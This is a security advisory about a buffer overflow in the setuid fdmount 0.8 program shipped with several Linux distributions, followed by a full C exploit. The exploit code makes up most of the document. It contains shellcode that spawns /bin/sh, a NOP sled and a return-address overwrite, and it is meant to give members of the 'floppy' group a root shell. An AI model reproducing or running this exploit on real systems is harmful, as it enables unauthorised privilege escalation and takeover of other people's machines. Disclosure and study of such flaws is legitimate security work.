source: http://www.securityfocus.com/bid/1239/info
  
A buffer overflow exists in the 0.8 version of the fdmount program, distributed with a number of popular versions of Linux. By supplying a large, well crafted buffer containing machine executable code in place of the mount point, it is possible for users in the 'floppy' group to execute arbitrary commands as root.
  
This vulnerability exists in versions of S.u.S.E., 4.0 and later, as well as Mandrake Linux 7.0. TurboLinux 6.0 and earlier ships with fdmount suid root, but users are not automatically added to the 'floppy' group. This list is by no means meant to be complete; other Linux distributions may be affected. To check if you're affected, check for the presence of the setuid bit on the binary. If it is present, and the binary is either world executable, or group 'floppy' executable, you are affected and should take action immediately. 

/* fdmount exploit
 *
 * by [WaR] <war@genhex.org> and Zav <zav@genhex.org>
 *
 * usage: ./fdmountx <offset>
 *   try with offset around 390 (you'll only get one try) 
 *
 *  Shout outs to all of the GenHex crew, and to 
 *            the #newbreed at irc.ptnet.org.
 */

#include <stdio.h>
#include <stdlib.h>

#define BUFFSIZE 70

char shell[] = /* by Zav */
   "\xeb\x33\x5e\x89\x76\x08\x31\xc0"
   "\x88\x66\x07\x83\xee\x02\x31\xdb"
   "\x89\x5e\x0e\x83\xc6\x02\xb0\x1b"
   "\x24\x0f\x8d\x5e\x08\x89\xd9\x83"
   "\xee\x02\x8d\x5e\x0e\x89\xda\x83"
   "\xc6\x02\x89\xf3\xcd\x80\x31\xdb"
   "\x89\xd8\x40\xcd\x80\xe8\xc8\xff"
   "\xff\xff/bin/sh";


main(int argc, char **argv)
{
  int i,j;
  char buffer[BUFFSIZE+6]; 
  unsigned long eip=(unsigned long)&eip;
  unsigned long *ptr;


  if(argc>1)
   eip+=atoi(argv[1]);

  memset(buffer,0x90,75);
  memcpy(buffer+(BUFFSIZE-strlen(shell)),shell,strlen(shell));

 ptr=(unsigned long*)(buffer+71);
 *ptr=eip;

 buffer[75]=0;
 buffer[0]='/';

 execl("/usr/bin/fdmount","fdmount","fd0",buffer,NULL);
}